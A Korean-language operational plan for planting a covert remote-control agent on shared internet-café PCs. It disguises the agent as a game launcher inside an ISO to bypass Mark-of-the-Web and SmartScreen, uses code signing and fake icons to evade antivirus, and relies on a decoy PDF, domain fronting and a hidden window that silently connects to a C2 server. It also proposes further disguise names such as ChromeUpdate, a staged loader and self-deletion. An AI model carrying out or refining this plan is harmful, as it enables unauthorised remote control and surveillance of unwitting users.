# PC방 배포 시나리오 (v1.0)

> 작성일: 2026-08-05
> 대상 환경: PC방 (관리자 권한 없음, DeepFreeze/재부팅 초기화, 공유 PC)
> 핵심 전략: **재부팅 시 초기화를 역이용** — 영속성 불필요, 세션 1회 실행

---

## 1. PC방 환경 제약 (이걸로 설계)

| 제약 | 영향 | 대응 |
|------|------|------|
| 일반 사용자 권한 (비관리자) | MSI 설치·서비스 등록 불가 | 단독 EXE 실행으로 해결 |
| DeepFreeze / 재부팅 초기화 | 영속성 무의미 (다 날아감) | 영속성 구현 안 함, 1회 실행 |
| SmartScreen / MotW | 다운로드 파일 차단 | ISO 마운트로 회피 |
| 백신 (V3 등) | PE 탐지 | 코드사인 + 아이콘/버전정보 위장 |
| USB 차단 | USB 배포 불가 | 웹 다운로드 / 이메일 / 클라우드 |
| 인터넷 제한 | 일부 사이트 차단 | 클라우드 드라이브 + 도메인 프론팅 |

## 2. 배포 산출물

```
GameLauncher_20260805_0244.iso  (7.0 MB, MotW 없음)
└── GameLauncher.exe             ← agent.exe 위장 (6.7 MB)
└── 게임런처_설치_안내.pdf         ← 감춤 문서 (열리면 정상 설치 안내처럼 보임)
```

## 3. 배포 경로 (PC방)

### 방법 A: 클라우드 드라이브 (추천)
1. ISO를 구글 드라이브 / 네이버 MYBOX / 원드라이브에 업로드
2. PC방에서 브라우저로 접속 → 다운로드
3. **다운로드한 ISO를 마운트** (더블클릭) → 안의 `GameLauncher.exe` 실행
   - ISO 내부 파일은 **Zone.Identifier(MotW)가 없어서** SmartScreen 경고 없음

### 방법 B: 이메일 첨부
- ISO 첨부 (일부 PC방은 첨부 확장자 차단할 수 있음)
- Gmail 등 웹메일로 접속

### 방법 C: 웹사이트 직접 호스팅
- ISO를 간단한 웹서버/클라우드 버킷에 올리고 짧은 URL로 배포

---

## 4. 실행 플로우 (사용자 관점)

```
1. ISO 다운로드 → 더블클릭 → 드라이브로 마운트
2. 게임런처_설치_안내.pdf (안내문) 열람
3. GameLauncher.exe 더블클릭
4. (백그라운드) 에이전트가 C2에 접속 — 화면 변화 없음
5. 관제 대시보드에서 온라인 확인 → 원격 제어
```

> ⚠️ 사용자가 PDF부터 열면 자연스러움. PDF는 진짜 정상 문서처럼 보임.

## 5. OPSEC 고려사항

| 항목 | 설명 |
|------|------|
| 1회 실행 후 종료 | PC방 재부팅 시 초기화되므로 잔여물 자동 제거 |
| 프로세스 이름 | `GameLauncher.exe` — 작업관리자에서도 정상 게임런처처럼 보임 |
| 창 없음 | GUI 윈도우 숨김 (`-H=windowsgui`), 사용자 인지 어려움 |
| 네트워크 | WSS(443 기반) + AEAD 암호화 — PC방 백신도 평문 트래픽 못 봄 |
| 세션0 한계 | 캡처는 인터랙티브 세션 에이전트만 실화면 — PC방 사용자 세션에서는 동작 |

## 6. 재빌드 방법

```bash
# 아이콘/버전정보/ISO 재생성
bash deploy/build_pcbang.sh
# 산출물: deploy/GameLauncher_<date>.iso
```

원하면 `deploy/build_pcbang.sh` 상단의 `DISGUISE_NAME`을 바꿔
다른 위장명으로 재빌드 가능 (예: `KakaoTalk_Setup`, `DiscordSetup`, `ChromeUpdate`).

## 7. 한계 & 개선 방향

| 한계 | 개선 |
|------|------|
| 6.7MB 단일 EXE — 백신 휴리스틱에 걸릴 수 있음 | 스테이지 분리: 작은 로더(loader.exe) + 원격 agent fetch |
| 게임런처 아이콘 — 실제 게임런처와 완전 동일하진 않음 | 실제 프로그램 아이콘 추출 후 교체 (상표권 주의) |
| SmartScreen "알 수 없는 게시자" 경고 가능 | 신뢰 코드사인 인증서 필요 (운영 시) |
| DeepFreeze 일부 버전은 부팅 직후 원상복구 전까지 파일 유지 | 세션 종료 전 자체삭제 로직 추가 가능 |
| PC방 관리 프로그램(게토/피카)이 미지 프로세스 차단할 수 있음 | 관리 프로그램 화이트리스트 등록 전략 (별도) |
